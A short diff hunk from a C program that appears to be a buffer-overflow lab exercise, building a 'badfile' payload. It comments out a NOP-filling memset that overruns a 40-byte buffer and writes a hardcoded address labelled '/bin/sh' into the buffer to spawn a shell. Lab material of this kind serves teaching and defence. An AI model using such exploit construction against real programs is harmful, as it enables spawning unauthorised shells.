@@ -23,7 +23,7 @@ void main(int argc, char **argv)
 	char buffer[40];
 	FILE *badfile;
 	/* Initialize buffer with 0x90 (NOP instruction) */
-	memset(&buffer, 0x90, 517);
+	//memset(&buffer, 0x90, 517);
 	/* You need to fill the buffer with appropriate contents here */
 	/* ... Put your code here ... */
 	*(long *) &buffer[32] = 0xb7ec582b;   //  "/bin/sh"
